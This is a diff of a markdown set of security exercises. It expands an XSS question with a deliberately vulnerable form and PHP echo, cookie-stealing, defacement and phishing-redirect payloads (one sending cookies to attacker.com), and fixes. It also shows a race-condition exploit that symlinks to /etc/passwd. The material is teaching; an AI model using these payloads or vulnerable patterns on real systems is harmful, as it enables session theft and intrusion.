@@ -95,7 +95,7 @@ if ($result->num_rows > 0) {
 $conn->close();
 ?>
 ```
-- The script directly displays usernames and passwords from the database.
+- The above script directly displays usernames and passwords from the database.
 
 - If passwords are stored in plaintext, an attacker can steal them.
 
@@ -153,8 +153,118 @@ $stmt->execute();
 This prevents SQL injection by treating the input as data, not SQL code.
 
 
+### ✅ **Question 4: Cross-Site Scripting (XSS)**
 
-### ✅ **Question 3: Race Condition Exploit**
+**Task:**  
+- Create an HTML form vulnerable to XSS.  
+- Inject a malicious script.  
+
+---
+
+✅ **Solution:**
+
+**Step 1: Vulnerable HTML Form**
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Demo</title>
+</head>
+<body>
+    <form action="xss.php" method="GET">
+        Name: <input type="text" name="name">
+        <input type="submit">
+    </form>
+</body>
+</html>
+```
+
+**Step 2: XSS Exploit**
+```html
+<script>alert('Hacked!')</script>
+```
+- When injected in the form, it executes malicious JavaScript.  
+
+---
+# **Why is this Vulnerable?**
+- The form does not sanitize or validate user input before sending it to xss.php.
+
+- If xss.php echoes the user’s input directly without escaping, it becomes vulnerable to Cross-Site Scripting (XSS).
+
+# **How an Attacker Exploits This?**
+- An attacker can submit the following payload into the `name` field:
+```
+<script>alert('Hacked!')</script>
+
+```
+If `xss.php` contains this vulnerable code:
+
+```
+<?php
+echo "Hello, " . $_GET['name'];
+?>
+```
+Then, if a user visits:
+
+```
+http://localhost/xss.php?name=<script>alert('Hacked!')</script>
+```
+The page will render:
+
+```
+Hello, <script>alert('Hacked!')</script>
+
+```
+And the script executes in the victim’s browser, displaying the alert "Hacked!".
+
+
+# **What Can an Attacker Do?**
+
+XSS allows attackers to: ✅ Steal Cookies:
+
+```
+<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
+```
+✅ Deface the Website:
+```
+<script>document.body.innerHTML = "<h1>You have been hacked!</h1>"</script>
+```
+✅ Redirect Users to a Malicious Site:
+
+```
+<script>window.location.href="http://phishing-site.com";</script>
+
+```
+
+# ** How to Fix XSS?**
+
+✅  1. Escape User Input in Output
+Use htmlspecialchars() in PHP:
+
+```
+<?php
+echo "Hello, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
+?>
+```
+This converts <script>alert('Hacked!')</script> into safe text, preventing script execution.
+
+✅ 2. Use Content Security Policy (CSP)
+Set a CSP header to block inline scripts:
+```
+header("Content-Security-Policy: default-src 'self'; script-src 'none';");
+
+```
+✅ 3. Validate Input
+
+```
+$name = preg_replace("/[^a-zA-Z0-9 ]/", "", $_GET['name']);
+```
+This form is vulnerable to XSS because it does not sanitize or escape user input. An attacker can inject JavaScript to steal data, deface the website, or perform malicious actions. The best fix is to use htmlspecialchars() and validate input properly.
+
+
+
+
+### ✅ **Question 4: Race Condition Exploit**
 
 **Task:**  
 - Write a C program with a race condition vulnerability.  
@@ -201,39 +311,5 @@ while true; do ln -sf /etc/passwd /tmp/race_file; done &
 ./race_vuln
 ```
 - Repeatedly symlink `/tmp/race_file` to `/etc/passwd`, exploiting the race condition.  
-
----
-
-### ✅ **Question 4: Cross-Site Scripting (XSS)**
-
-**Task:**  
-- Create an HTML form vulnerable to XSS.  
-- Inject a malicious script.  
-
----
-
-✅ **Solution:**
-
-**Step 1: Vulnerable HTML Form**
-```html
-<!DOCTYPE html>
-<html>
-<head>
-    <title>XSS Demo</title>
-</head>
-<body>
-    <form action="xss.php" method="GET">
-        Name: <input type="text" name="name">
-        <input type="submit">
-    </form>
-</body>
-</html>
-```
-
-**Step 2: XSS Exploit**
-```html
-<script>alert('Hacked!')</script>
-```
-- When injected in the form, it executes malicious JavaScript.  
 
 ---
